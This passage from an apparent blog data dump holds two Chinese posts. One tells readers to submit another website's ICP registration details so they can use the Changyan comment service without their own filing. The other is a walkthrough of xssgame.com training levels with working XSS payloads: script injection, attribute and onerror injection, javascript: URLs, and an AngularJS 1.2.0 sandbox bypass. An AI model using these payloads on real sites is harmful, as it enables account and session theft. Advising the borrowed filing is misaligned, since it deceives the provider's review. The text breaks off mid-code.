\n多说团队宣布2017年6月1日正式关闭服务，不巧的是我用的也是多说，所以开始了辗转之旅。  \n多番体验后选择使用畅言，网易云跟帖的风格让我感觉跟blog格格不入也是一方面因素。 \n\n适合人群：\n* github建站未购买私人域名无法备案\n* 已拥有国内域名但因种种原因没有备案\n\n# 原理\n\n利用畅言网站备案审核后的白名单机制让自己的网站也能使用畅言。  \n是的，如果你比较聪明的话，看到这里你应该知道该怎么搞了。\n\n\n# 细节\n\n### 正常注册畅言用户\n\n这一步跳过了，确实没什么可说的\n\n### 提交申请\n\n![beianshenqing](/Image/beianshenqing.png)\n\n因为我已经审核通过，所以上面显示已通过，不用纠结这一点。  \n关于备案，我当初用baidu站点尝试，完全是想法的尝试没想那么多。  \n不过若畅言团队封掉同一站点网址多个实例注册的话，审核很容易就不通过了。  \n建议去使用一些其他站点的备案信息。  \n备案信息获取可百度：备案信息查询。随便找域名，拿来备案信息就用~\n然后提交审核，耐心等待审核通过。  \n\n### 修改域名白名单\n\n![xiugaibaimingdan](/Image/xiugaibaimingdan.png)\n\n审核通过完毕后，按照图中方式修改域名白名单，然后等待官方确认修改的通知。  \n收到通知后，你的就可以开心的使用畅言了~\n\n### 已知小问题\n\n无法在本地调适时，即 localhost 访问时显示评论，不过不影响使用。如果大家有解决方案欢迎告诉我~","source":"_posts/changyancrack.md","raw":"---\ntitle: 国内无备案网站使用畅言评论系统\ndate: 2017-5-13 07:50:28\nlayout: post\ncomments: true\nreward: true\ntags:\n    - 工具\n    - 音乐\n---\n\n<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=330 height=86 src=\"//music.163.com/outchain/player?type=2&id=5133273&auto=0&height=66\"></iframe>\n\n> 本来朋友圈说昨晚把教程发出来，结果……到家后衣服都没脱就睡了。\n早上五点恢复意识，磨蹭到7点才打开电脑。\n\n<!--more-->\n\n# 背景\n\n畅言评论系统是搜狐搞出来的一个免费的评论系统，对于小站不想花精力去做评论系统的人确实很方便。  \n类似的评论系统常用的有：多说、网易云跟帖、友言等。  \n多说团队宣布2017年6月1日正式关闭服务，不巧的是我用的也是多说，所以开始了辗转之旅。  \n多番体验后选择使用畅言，网易云跟帖的风格让我感觉跟blog格格不入也是一方面因素。 \n\n适合人群：\n* github建站未购买私人域名无法备案\n* 已拥有国内域名但因种种原因没有备案\n\n# 原理\n\n利用畅言网站备案审核后的白名单机制让自己的网站也能使用畅言。  \n是的，如果你比较聪明的话，看到这里你应该知道该怎么搞了。\n\n\n# 细节\n\n### 正常注册畅言用户\n\n这一步跳过了，确实没什么可说的\n\n### 提交申请\n\n![beianshenqing](/Image/beianshenqing.png)\n\n因为我已经审核通过，所以上面显示已通过，不用纠结这一点。  \n关于备案，我当初用baidu站点尝试，完全是想法的尝试没想那么多。  \n不过若畅言团队封掉同一站点网址多个实例注册的话，审核很容易就不通过了。  \n建议去使用一些其他站点的备案信息。  \n备案信息获取可百度：备案信息查询。随便找域名，拿来备案信息就用~\n然后提交审核，耐心等待审核通过。  \n\n### 修改域名白名单\n\n![xiugaibaimingdan](/Image/xiugaibaimingdan.png)\n\n审核通过完毕后，按照图中方式修改域名白名单，然后等待官方确认修改的通知。  \n收到通知后，你的就可以开心的使用畅言了~\n\n### 已知小问题\n\n无法在本地调适时，即 localhost 访问时显示评论，不过不影响使用。如果大家有解决方案欢迎告诉我~","slug":"changyancrack","published":1,"updated":"2017-08-27T16:05:33.000Z","photos":[],"link":"","_id":"cjh9h0k870005mkwblt8j51rz","content":"<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=5133273&auto=0&height=66\"></iframe>\n\n<blockquote>\n<p>本来朋友圈说昨晚把教程发出来，结果……到家后衣服都没脱就睡了。<br>早上五点恢复意识，磨蹭到7点才打开电脑。</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h1><p>畅言评论系统是搜狐搞出来的一个免费的评论系统，对于小站不想花精力去做评论系统的人确实很方便。<br>类似的评论系统常用的有：多说、网易云跟帖、友言等。<br>多说团队宣布2017年6月1日正式关闭服务，不巧的是我用的也是多说，所以开始了辗转之旅。<br>多番体验后选择使用畅言，网易云跟帖的风格让我感觉跟blog格格不入也是一方面因素。 </p>\n<p>适合人群：</p>\n<ul>\n<li>github建站未购买私人域名无法备案</li>\n<li>已拥有国内域名但因种种原因没有备案</li>\n</ul>\n<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><p>利用畅言网站备案审核后的白名单机制让自己的网站也能使用畅言。<br>是的，如果你比较聪明的话，看到这里你应该知道该怎么搞了。</p>\n<h1 id=\"细节\"><a href=\"#细节\" class=\"headerlink\" title=\"细节\"></a>细节</h1><h3 id=\"正常注册畅言用户\"><a href=\"#正常注册畅言用户\" class=\"headerlink\" title=\"正常注册畅言用户\"></a>正常注册畅言用户</h3><p>这一步跳过了，确实没什么可说的</p>\n<h3 id=\"提交申请\"><a href=\"#提交申请\" class=\"headerlink\" title=\"提交申请\"></a>提交申请</h3><p><img src=\"/Image/beianshenqing.png\" alt=\"beianshenqing\"></p>\n<p>因为我已经审核通过，所以上面显示已通过，不用纠结这一点。<br>关于备案，我当初用baidu站点尝试，完全是想法的尝试没想那么多。<br>不过若畅言团队封掉同一站点网址多个实例注册的话，审核很容易就不通过了。<br>建议去使用一些其他站点的备案信息。<br>备案信息获取可百度：备案信息查询。随便找域名，拿来备案信息就用~<br>然后提交审核，耐心等待审核通过。  </p>\n<h3 id=\"修改域名白名单\"><a href=\"#修改域名白名单\" class=\"headerlink\" title=\"修改域名白名单\"></a>修改域名白名单</h3><p><img src=\"/Image/xiugaibaimingdan.png\" alt=\"xiugaibaimingdan\"></p>\n<p>审核通过完毕后，按照图中方式修改域名白名单，然后等待官方确认修改的通知。<br>收到通知后，你的就可以开心的使用畅言了~</p>\n<h3 id=\"已知小问题\"><a href=\"#已知小问题\" class=\"headerlink\" title=\"已知小问题\"></a>已知小问题</h3><p>无法在本地调适时，即 localhost 访问时显示评论，不过不影响使用。如果大家有解决方案欢迎告诉我~</p>\n","site":{"data":{}},"excerpt":"<iframe frameborder=\"no\" border=\"0\" marginwidth=\"0\" marginheight=\"0\" width=\"330\" height=\"86\" src=\"//music.163.com/outchain/player?type=2&id=5133273&auto=0&height=66\"></iframe>\n\n<blockquote>\n<p>本来朋友圈说昨晚把教程发出来，结果……到家后衣服都没脱就睡了。<br>早上五点恢复意识，磨蹭到7点才打开电脑。</p>\n</blockquote>","more":"<h1 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h1><p>畅言评论系统是搜狐搞出来的一个免费的评论系统，对于小站不想花精力去做评论系统的人确实很方便。<br>类似的评论系统常用的有：多说、网易云跟帖、友言等。<br>多说团队宣布2017年6月1日正式关闭服务，不巧的是我用的也是多说，所以开始了辗转之旅。<br>多番体验后选择使用畅言，网易云跟帖的风格让我感觉跟blog格格不入也是一方面因素。 </p>\n<p>适合人群：</p>\n<ul>\n<li>github建站未购买私人域名无法备案</li>\n<li>已拥有国内域名但因种种原因没有备案</li>\n</ul>\n<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><p>利用畅言网站备案审核后的白名单机制让自己的网站也能使用畅言。<br>是的，如果你比较聪明的话，看到这里你应该知道该怎么搞了。</p>\n<h1 id=\"细节\"><a href=\"#细节\" class=\"headerlink\" title=\"细节\"></a>细节</h1><h3 id=\"正常注册畅言用户\"><a href=\"#正常注册畅言用户\" class=\"headerlink\" title=\"正常注册畅言用户\"></a>正常注册畅言用户</h3><p>这一步跳过了，确实没什么可说的</p>\n<h3 id=\"提交申请\"><a href=\"#提交申请\" class=\"headerlink\" title=\"提交申请\"></a>提交申请</h3><p><img src=\"/Image/beianshenqing.png\" alt=\"beianshenqing\"></p>\n<p>因为我已经审核通过，所以上面显示已通过，不用纠结这一点。<br>关于备案，我当初用baidu站点尝试，完全是想法的尝试没想那么多。<br>不过若畅言团队封掉同一站点网址多个实例注册的话，审核很容易就不通过了。<br>建议去使用一些其他站点的备案信息。<br>备案信息获取可百度：备案信息查询。随便找域名，拿来备案信息就用~<br>然后提交审核，耐心等待审核通过。  </p>\n<h3 id=\"修改域名白名单\"><a href=\"#修改域名白名单\" class=\"headerlink\" title=\"修改域名白名单\"></a>修改域名白名单</h3><p><img src=\"/Image/xiugaibaimingdan.png\" alt=\"xiugaibaimingdan\"></p>\n<p>审核通过完毕后，按照图中方式修改域名白名单，然后等待官方确认修改的通知。<br>收到通知后，你的就可以开心的使用畅言了~</p>\n<h3 id=\"已知小问题\"><a href=\"#已知小问题\" class=\"headerlink\" title=\"已知小问题\"></a>已知小问题</h3><p>无法在本地调适时，即 localhost 访问时显示评论，不过不影响使用。如果大家有解决方案欢迎告诉我~</p>"},{"title":"「从入门到入狱系列」 - xssgame 通关经验(草稿)","date":"2017-08-02T16:00:00.000Z","layout":"post","comments":1,"reward":true,"_content":"\n此链接只能墙外围观享用\n\n主站：[www.xssgame.com](http://www.xssgame.com) \n\n![StartPlay](/Image/Start_Playing.png)  \n\n<!-- more -->\n***\n刚一进来我们就看到了一个黑影脚踏拔丝煎面飞入了一坨乳……啊脂肪中。\n这个设计游戏的人是个高手，如果是未经此事的年轻人看见，现在可能吓得把裤子都脱了……\n\n下面进入正片，车辆起步，请坐稳扶好，靠近屏幕的乘客，请系好裤腰带。\n## LEVEL 1\n[贴心的传送门](http://www.xssgame.com/m4KKGHi2rVUN)\n\n![StartPlay](/Image/Level_1_Welcome.png)\n上面的英文大致是个玩法的介绍和一些关于本关的信息：  \n>此级别显示XSS的常见原因，其中用户输入直接写入页面而不进行正确的转义。  \n与下面的脆弱应用程序窗口进行交互，并找到一种方法来执行您选择的JavaScript。 您可以在易受攻击的窗口内采取行动，或直接编辑其网址栏。  \n输入一个将使应用程序在JavaScript中执行alert()函数的输入。  \n一旦您弹出警报，该解决方案将在服务器端进行验证，您将能够进入下一个级别。 重要的是，解决方案不需要用户交互 - 打开URL应该足以触发警报。  \n--来自原汁原味的 translate.google.com （自己感受下）\n\n「说人话！」\n\n通过改造URL，在访问原页面时执行 javascript 的 alert()，并且保证任何人直接访问你修改后的URL时都能弹出alert框……。\n\n至于 javascript、alert 是什么，alert 与 XSS 到底是什么关系，为啥 XSS 的游戏要让你用 alert 过关呢，我就不赘述了，百度一下你就上当：）\n\n「上当咋整啊，本来就啥都不会，不能告诉个不上当的方法？」\n\n你别说，还真能：\n\n![ad](/Image/ad.png)\n\n//我是一个不生硬的过度，下面开始正题 →_→ 跑太远扯不回来了\n\n我们打开 chrome 浏览器的开发者工具(F12)看一下这个站的页面相关文件。\n\n![LEVEL_1_TREE_DETAIL](/Image/Level_1_Tree_Detail.png)\n\n其中 *index* 是主页文件，*foogle.png* 是大 Foogle Logo，唯独 *js_frame.js* 不确定。进去看看后发现这个文件是判定你的 XSS 是否符合要求的“xssgame 游戏的官方文件”，这里不分析，因其非本篇重点，直接给定义略过。\n\n*index* 中是一个简单的 form 表单的提交。我们随便搜点什么后：  \n1.URL 变化  \n2.页面重新加载  \n3.刚刚搜索的内容被一起加载到也页面中。  \n\n其中 URL 结尾的 ?query= 后面的字符串跟页面上显示的字符串一致。\n回到我们的初衷，要让其弹窗。那我们只需要让页面被嵌入一段被加载时弹窗的 javascript 代码段就好了：\n```\n<script>alert()</script>\n```\n拼出如下URL：\n\n```\nhttp://www.xssgame.com/f/m4KKGHi2rVUN/?query=<script>alert()</script>\n```\n\n**使其在页面加载时就载入含有 alert 效果的 javascript 代码块。**\n\n过关：\n![LEVEL_1_PASS](/Image/LEVEL_1_Pass.png)\n\n## LEVEL 2\n[贴心的传送门](http://www.xssgame.com/WrfpuKFX8GNr)\n\n![StartPlay2](/Image/Level_2_Welcome.png)\n***\n来看一下页面上的信息：\n>用户提供的数据的每一位都必须正确地转义为其出现的页面的上下文。 这个级别显示为什么。  \n输入一个将使应用程序在JavaScript中执行alert()函数的输入。  \n--来自原汁原味的 translate.google.com （哎，不背锅，哎）\n\n大意是在提醒我们，要注意每一个比特。  \n举个栗子：你以为你家孩子就是你亲生的，但隔壁老王每天冲你笑，毕竟你不是每天晚上都在家。 \n\n// 不生硬，一点都不生硬的过度\n\n初次加载的文件中规中矩，一个*index*里面一个通过 GET 方式提交的 form 表单，表单提交一个 timer 参数给后台，以及一个 js_frame.js 文件。\n\n我们先填一个正常的参数，提交一下试试看，默认是3，那就填3吧：  \n![CreateTimer](/Image/Level_2_Create_Timer.png)\n\n来看一下新跳转的页面有哪些需要注意的东西：  \n![CreateTimer](/Image/Level_2_Timer_Js.png)\n\n我们观察发现：\n```html\n<img id=\"loading\" src=\"/static/img/loading.gif\" style=\"width: 50%\" onload=\"startTimer('3');\" />\n```\n和\n```html\n<div id=\"message\">Your timer will execute in 3 seconds.</div>\n```\n两处回显了我们的数据。而前半部 javascript 代码也有一个3：\n```js\nfunction startTimer(seconds) {\n    seconds = parseInt(seconds) || 3;\n    setTimeout(function() {\n        window.confirm(\"Time is up!\");\n        window.loading.style.display = 'none';\n        window.message.innerHTML = '<a href=\"?\">Go back</a> to the timer setup page';\n    }, seconds * 1000);\n}\n```\n提交其他参数后发现，跟我们提交的参数无关，无视之。  \n那么前两处中，我们先看第一处（看到这个字就有点怪怪的感觉……）：\n```html\n<img id=\"loading\" src=\"/static/img/loading.gif\" style=\"width: 50%\" onload=\"startTimer('3');\" />\n```\n这里可以搞：\n```js\nonload = \"startTimer('3');\"\n```\n怎么搞呢，你需要知道一个知识点：\n```js\n<script>\n    var a = 'a' + alert(); // 或者 '-' 也可以，重点在于让 alert() 参与运算\n\n    // 当 alert() 参与运算的时候\n    // js 会尝试让 alert() 先执行\n    // 然后取其执行后的返回值再参与前面的运算\n    // 我就问你任性不。「任性~」『←_← 真尼玛能给自己加戏』\n</script>\n```\n我们再结合 img 标签的 onload 事件：\n```js\nonload = \"startTime('?')\"; // 这里需要把上面的知识点利用上 也就是把 alert() 以合适的体位插入 ? 的地方\n/*\n    别往下瞅了，下面就是答案了，自己不寻思寻思啊\n    强行占一行\n    再来一行\n    嗯，上下注释符号还能占两行，差不多了。\n*/\n// 先尝试直接插入alert()\nonload = \"startTimer('alert()')\"; // startTimer('alert()'); …… 这不直接当字符串传过去了吗…… 不行\n// 看看上面的知识点……\n// 插入 a'+alert()+'a\nonload = \"startTimer('a'+alert()+'a')\"; // 这应该差不多了…… 可是好像a没啥用啊，不传不也还是字符串吗，只不过是空字符串\n// 插入 '+alert()+'\nonload = \"startTimer(''+alert()+'')\";\n\n```\n嗯，想好了体位，接下来要后退几步，对着 URL 酝酿一下~\n```\nhttp://www.xssgame.com/f/WrfpuKFX8GNr/?timer='+alert()+'\n```\n提交一下……\n「我曹不对吧」\n「这也没过关啊，日，讲啥呢一天天。」\n「你哔哔这么长时间，念经呢这是？」\n别着急，'+' 号在URL里有独特的含义，直接写进去就当成URL约定的含义去解读了。\n我们这边转义一下这个'+'字符,在 chrome 控制台中输入这个函数并按回车，会返回给你一个转义后的字符串：\n![Level_2_URL_Encode](/Image/Level_2_URL_Encode.png)  \n我们用%2B（或%2b）替换一下原来的加号。\n```\nhttp://www.xssgame.com/f/WrfpuKFX8GNr/?timer='%2Balert()%2B'\n```\n过关：\n![Level_2_Pass](/Image/Level_2_Pass.png)  \n上图中的 URL 虽然我们提交的是'%2B',浏览器最后再显示给你的时候会自动帮你转回来方便你阅读。如果你此时不修改'+'为'%2B'再提交一次，你就会发现你提交的是'+',我们也并没有再次过关 :)  \n另外，直接用'-'号其实没这么麻烦，不用转义，直接写就行 :)  \n「……」  \n![pugai](/Image/pugaizai.jpeg)  \n**上面的两chu，我只说了第一chu，那第二chu朋友们自行尝试（第一关的套路照搬过来行不通哟~）**\n\n## LEVEL 3\n[贴心传送门](http://www.xssgame.com/u0hrDTsXmyVJ)  \n\n![Level_3_Welcome](/Image/Level_3_Welcome.png)  \n***\n见证机翻的时刻：\n>复杂的Web应用程序通常会在JavaScript中生成UI的部分内容。 一些常见的JS功能是执行接收器，这意味着它们将导致浏览器执行出现在其输入中的任何脚本。  \n该级别的应用程序正在使用一个这样的接收器。  \n由于您无法在应用程序中的任何位置输入您的负载，因此您必须手动编辑提供的URL栏中的地址。 目标是利用应用程序中的一个漏洞来执行JavaScript alert()函数。  \n--来自看完觉得没什么卵用的 translate.google.com  \n\n其实我在通这个系列的时候是没看这些提示信息的，一是觉得不看也能过，二是怕自己的想法被提示牵着走，这样过关也挺没劲的。嗯，类似「圣人模式」那种惆怅。  \n后来总结的时候呢，发现里面确实是有一些信息的，写经验的时候还是写进来比较好，万一对一些人有帮助呢，所以我就插了个机翻，并因为经费紧张，旁白君的解读直接砍掉了:) \n\n// 过渡~\n看得出来，这是一位吸猫癌患者:\n```html\n    <div class=\"tab\" id=\"tab1\" onclick=\"chooseTab('1')\">Cat 1</div>\n    \n    <div class=\"tab\" id=\"tab2\" onclick=\"chooseTab('2')\">Cat 2</div>\n    \n    <div class=\"tab\" id=\"tab3\" onclick=\"chooseTab('3')\">Cat 3</div>\n```\n*index* 里非常暴躁的来了个 Cat 1 2 3，直让我菊花一紧：  \n\n![bbox](/Image/shut_up_and_bbox.jpg)  \n\n奈何对猫有些抗拒，看见 onclick 事件基本没什么点一下试试看的想法，那就只能看代码了：\n```js\nfunction chooseTab(name) {\n    var html = \"Cat \" + parseInt(name) + \"<br>\";\n    html += \"<img src='/static/img/cat\" + name + \".jpg' />\";\n    document.getElementById('tabContent').innerHTML = html;\n\n    // Select the current tab\n    var tabs = document.querySelectorAll('.tab');\n    for (var i = 0; i < tabs.length; i++) {\n        if (tabs[i].id == \"tab\" + parseInt(name)) {\n            tabs[i].className = \"tab active\";\n        } else {\n            tabs[i].className = \"tab\";\n        }\n    }\n    window.location.hash = name;\n\n    // Tell parent we've changed the tab\n    top.postMessage({'url': self.location.toString()}, \"*\");\n}\n\n```\n这个方法的实现看到第三行就不用看了，已经知道在干嘛了，传进来一个数字，请求相应'数字.jpg'的图片。\n```\n需要注意的是通过 innerHTML 写到 div 中。而 innerHTML 方法直接写入的 <script>...</script> 并不会被执行。\n```\n没关系啊，有了上一关的经验，我们可以拼字符串啊。\n佛死特奥富奥，你得知道个知识点：\n```html\n<img src='' onerror='alert()' />\n<!--\n    当图片加载错误的时候，就会执行 onerror 中的 alert() 方法\n    对于本关\n    我们只需要让他访问一个不存在的图片并让其执行 onerror='alert()' 就OK了\n    你问我怎么让它执行？\n    插啊，插进去不就行了吗 →_→\n--> \n```\n我们拼出如下URL：\n```\nhttp://www.xssgame.com/f/u0hrDTsXmyVJ/#1' onerror='alert()'\n```\n**用单引号截断1,使其 scr 指向'1'这个文件，并加入 onerror 事件，而因为'1'这个文件不存在，加载错误，转而执行 onerror 中的 alert() 方法。**\n\n过关：  \n![Level_3_Pass](/Image/Level_3_Pass.png)\n\n## LEVEL 4\n\n[贴心传送门](http://www.xssgame.com/__58a1wgqGgI)\n\n![Level_4_Welcome](/Image/Level_4_Welcome.png)  \n\n来看一下提示里面的有效信息:\n>跨站点脚本不仅仅是正确地转义数据。 有时，即使没有在DOM中注入新的元素，攻击者也可以做坏事。\n\n再来看一下页面内容：\n\n![Level_4_Sign_up](/Image/Level_4_Sign_Up.png)\n\n我们先跟着流程走一下，过程中看看有没有什么可利用的地方：\n\nsign up 按钮的代码是这样的：\n```html \n<a href=\"signup?next=confirm\">Sign up</a> \n```\n\n点击以后，我们跳转到这个页面：\n\n![Level_4_Enter_Email](/Image/Level_4_Enter_Email.png)\n\n\n页面中有一段注释：\n```html\n    <!-- We're ignoring the email, but the poor user will never know! -->\n```\n……神经病\n\nnext >> 的代码是这样：\n```html\n<a href=\"confirm?next=welcome\">Next >></a>\n```\n点击 next >> 会跳转到下一个页面\n\n![Level_4_Thanks_For](/Image/Level_4_Thanks_For.png)\n\n页面代码如下：\n\n![Level_4_Thanks_For_Source](/Image/Level_4_Thanks_For_Source.png)\n\n我们注意到有这样一个地方：\n```js\n<script>\n    setTimeout(function() { window.location = 'welcome'; }, 1000);\n</script>\n```\n其中的'Welcome'像是我们 URL 中传入的参数。\n经传入其他参数测试，发现 window.location = 我们传入的参数。\n这样问题就简单了，首先，知识点你得有：\n```js\n    window.location = 'welcome'; \n    /*\n        这是一个页面重定向的操作\n        这里就不展开普及了,可以去 w3school 充充电。\n        window.location 等同于 window.location.href\n        而 DOM 的 href 属性呢，支持这样写：\n        <a href='javascript:alert()' > </a>\n        咳咳，你懂得。\n    */\n```\n所以这边只需要传入：'javascript:alert()' 来替换 'welcome' 就可以了：\n拼出如下 URL:\n```\nhttp://www.xssgame.com/f/__58a1wgqGgI/confirm?next=javascript:alert()\n```\n过关:\n![Level_4_Pass.png](/Image/Level_4_Pass.png)\n\n## LEVEL 5\n\n[贴心传送门](http://www.xssgame.com/JFTG_t7t3N-P)\n\n![Level_5_Welcome](/Image/Level_5_Welcome.png)\n\n有请我们的翻译君：\n>Angular是一个非常受欢迎的框架，它在安全开发应用程序时拥有自己的一套规则。 其中之一是在Angular的模板系统运行之前修改DOM时应该小心。  \n这个挑战是为什么这很重要。  \n目标是再次利用应用程序中的漏洞来执行JavaScript alert（）函数。  \n\n对，我们查看页面文件结构的时候也注意到了这次的页面使用了 Angular。\n\n「Angular是啥？」\n\n![heiren](/Image/hei1.jpeg)\n\n其实 Angular 是啥不重要，即使不了解，还是可以搞的哈，别着急。\n\n我们先常规思路分析一波，先看看页面文件的内容：\n```js\n<script>\n      angular.module('myApp', [])\n      .controller('myController', ['$scope', function ($scope) {\n        $scope.query = \"\";\n        $scope.alert = window.alert;\n      }]);\n\n      var UTM_PARAMS = [\"utm_content\", \"utm_medium\", \"utm_source\",\n          \"utm_campaign\", \"utm_term\"]\n\n      if (location.search)\n      {\n        var params = location.search.substring(1).split('&');\n\n        for (var p in params) {\n          var r = params[p].split('=');\n\n          if (r.length == 2 && UTM_PARAMS.indexOf(r[0]) != -1) {\n            var el = document.getElementsByName(r[0]);\n            if (el.length) el[0].value = decodeURIComponent(r[1]);\n          }\n        }\n      }\n    </script>\n```\n这里就提供了足够的信息够我们过关了。\n这段 js 的逻辑每一步是什么样的我就不细说了，大家自己看吧，我就说说大体是在干什么吧。\n先定义了一个数组，用来过滤 URL 中的参数。\n过滤出参数以后呢，去页面上找相应的节点。并给节点赋值。页面中的节点有这几个：\n```html\n    <input id=\"demo2-query\" name=\"query\" maxlength=\"140\" ng-model=\"query\" placeholder=\"Enter query here...\">\n    <input name=\"utm_term\" type=\"hidden\">\n    <input name=\"utm_campaign\" type=\"hidden\" value=\"cpc\">\n    <input id=\"demo2-button\" type=\"submit\" value=\"Search\">\n```\n聪明的小伙伴听到给页面的节点赋值应该就开窍了，对了，这里可以搞啊可以搞。\n怎么搞呢？\n我们先搜下 Angular 中 alert 怎么写：\n```js\n{{alert()}}\n```\n好知道了这个我们构建 URL，就选择 'utm_term' 这个节点吧：\n```\nhttp://www.xssgame.com/f/JFTG_t7t3N-P/?utm_term={{alert()}}\n```\n过关：\n\n![Level_5_Pass](/Image/Level_5_Pass.png)\n\n(至于为啥用 Angular，不直接插代码试试看呢，需要自己插一插试试哦~)\n\n## LEVEL 6\n\n[贴心传送门](http://www.xssgame.com/rWKWwJGnAeyi)\n\n![Level_6_Welcome](/Image/Level_6_Welcome.png)\n\n（前面那个关的 boss 死了，儿子又来了？？？）\n\n没什么卵用的翻译（其实还是有用的~）：\n>导致角度注入的其他常见编程模式是使用服务器端模板系统生成Angular用作其自己的模板的HTML。 即使服务器端模板保证输出中没有“普通”XSS，这一点也是如此。  \n目标是再次利用应用程序中的漏洞来执行JavaScript alert（）函数。\n\n这次我们看看页面代码，没什么特别的地方。用搜索功能搜一下发现有情况：\n\n![Level_6_Search](/Image/Level_6_Search.png)\n\n手动输入 **query** 使用 get 方式搜索：\n\n![Level_6_Query](/Image/Level_6_Query.png)\n\n我们注意到页面均显示出我们之前搜索的字符串。\n\n新的页面中的代码：\n\n```html\n<p ng-non-bindable>Sorry, no results were found for <b>1234</b>.</p>\n```\n\n'ng-non-bindable' 这个是在声明此段落不需要 AngularJS 来编译，也就是说我们上一关的套路不能用了。不过没关系，我们搞 form 中的那个。\n\n我们注意到这样一段代码：\n\n```html\n<script src=\"//ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js\"></script>\n```\n\n没记错的话之前那关是 1.5.x，我们都知道，软件要及时更新，不然漏洞会被利用搞事情。\n这个反差好像就是在告诉我们这件事，那就去搜一下 bug 咯，google 一下。\n\n![Level_6_Google_XSS](/Image/Level_6_Google_XSS.png)\n\n按照惯例，我们先看一下第一个：\n```html\nhttp://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html\n```\n![Level_6_PortSwigger](/Image/Level_6_PortSwigger.png)\n\n有兴趣的可以去看一下，写的头头是道啊~\n\n当然我们是通关攻略，这里还是要专注于我们的正事儿啊。 「之前瞎BB，跑偏的时候忘了？」：\n我们发现其中提及了一个 Angular 1.2.0-1.2.1 的 Sandbox bypasses：\n\n```js\n{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}\n```\n直接拿现成的来用还是很爽的哈，通过 chrome 查看我们查询的时候传的参数是：\n\n![Level_6_Search_Para](/Image/Level_6_Search_Para.png)\n\n我们拼一下 URL：\n```\nhttp://www.xssgame.com/f/rWKWwJGnAeyi/?query={{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert()')()}}\n```\n好，提交，过关：\n\n![heiren](/Image/hei2.jpeg)\n\n![Level_6_Query_String](/Image/Level_6_Query_String.png)\n```\n把'{'、'}'换成'&lcub;'、'&rcub;'试一下(google 来的~我也记不住是啥。)\n也可以只替换'{',因为'}'并没有被过滤，不过我查都查了，替！\n```\n\n新的 URL：\n```\nhttp://www.xssgame.com/f/rWKWwJGnAeyi/?query=&lcub;&lcub;a='constructor';b=&lcub;&rcub;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert()')()&rcub;&rcub;\n```\n冲啊，旋风冲锋龙…… 「能他妈不中二了吗？」：\n\n![Level_6_Pass](/Image/Level_6_Pass.png)\n\n咳咳，过关过关……\n\n## LEVEL 7\n\n[贴心传送门](http://www.xssgame.com/wmOM2q5NJnZS)\n\n![Level_7_Welcome.png](/Image/Level_7_Welcome.png)\n\n翻译君：\n>内容安全策略是防止注入到可扩展XSS中的重要工具。 但这不是一个银弹 - 多次CSP政策可以绕过。  \n这个挑战显示了一种常见的CSP旁路技术。  \n目标是再次使用应用程序中的循环来执行JavaScript alert()函数。\n\n其中提到了一个东西 'CSP' 就是'内容安全策略', 这是啥东西呢？\n\n>内容安全策略（CSP）是一种计算机安全标准，旨在防止在受信任的网页上下文中执行恶意内容导致的跨站点脚本（XSS），劫持劫持和其他代码注入攻击。  \n-- 来自 wiki 百科\n\n这次除了 (index) 文件，我们还有两个地方需要关注下：\n\n![Level_7_Web_DOM](/Image/Level_7_Web_DOM.png)\n\n按照惯例，我们先看一下页面文件 (index)：\n```html\n<a href=\"?menu=YWJvdXQ=\">About Me</a>\n<a href=\"?menu=Y2F0cw==\">Cats</a>\n<a href=\"?menu=ZG9ncw==\">Dogs</a>\n<script src=\"/static/js/level7.js\"></script>\n```\n我们可以看出来，我们三个标签后会请求 ?menu=不知道是啥玩意。下面加载了叫做 level7.js 的文件。\n\n我们再来看 Level7.js 这个文件，读完他的 js 代码后我们大致明白了他在干什么：\n```js\nfunction main(){\n    //找到 URL 中 “menu=？” 的参数，并把？参数动态拼接成一个 <script> 标签，来访问资源。\n    //atob 对应的是 Base64 编码方式的解码操作，是的，btoa就是编码\n}\n\nfunction callback(data){\n    // 通过代码判断，data 应该是 json 格式。\n    // 取出其中的 title 和 pictures 对应的 value，拼接成 HTML 代码，插入到页面中，来访问资源\n}\nmain(); //执行 main 方法\n```\n\n这个代码段比较简单，我们看一下 'jsonp?menu=about' 的内容：\n\n![level_7_Web_Jsonp](/Image/Level_7_Web_Jsonp.png)\n\n我们注意到，其中开头的 callback 与我们 level7.js 中的 callback 方法的名称一样，而且内容中也含有相应的 title 与 pictures，我们基本可以确定这个 json 串返回后会自动执行 callback 函数，像是某种约定，我们去查查看这个 'jsonp'：\n\n![Level_7_Jsonp_XSS](/Image/Level_7_Jsonp_XSS.png)\n\n呀呵，第一个就是知道创宇的文章: [JSONP 安全攻防技术](http://blog.knownsec.com/2015/03/jsonp_security_technic/)\n\n```\nJSONP：\nJSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里 <script></script> 元素标签，远程调用 JSON 文件来实现数据传递。\n```\n这里不展开讲 JSONP 了，如果感兴趣可以去看原博了解后再回来看文章。\n\n回到正题，文中有这样一段引起了我们的注意：\n\n![Level_7_Jsonp_XSS_Blog](/Image/Level_7_Jsonp_XSS_Blog.png)\n\n我们用 callback 这个参数去我们的 Level 7 中测试一下：\n\n![Level_7_Callback_Test](/Image/Level_7_Callback_Test.png)\n\nok，测试成功，证明后台代码存在缺陷，暂时还不知道要怎么用，不急，上面我们大概扫了下网站的大致流程，接下来我们来仔细分析一下他的代码，看看没有没可以利用的地方。\n\nLevel7.js 当然是我们重点关注的对象,我们先来看一下 main 方法：\n```js\nfunction main() {\n    var m = location.search.match('menu=(.*)');// 查找了一下当前 URL 中 'menu=' 后面的参数\n    var menu = m ? 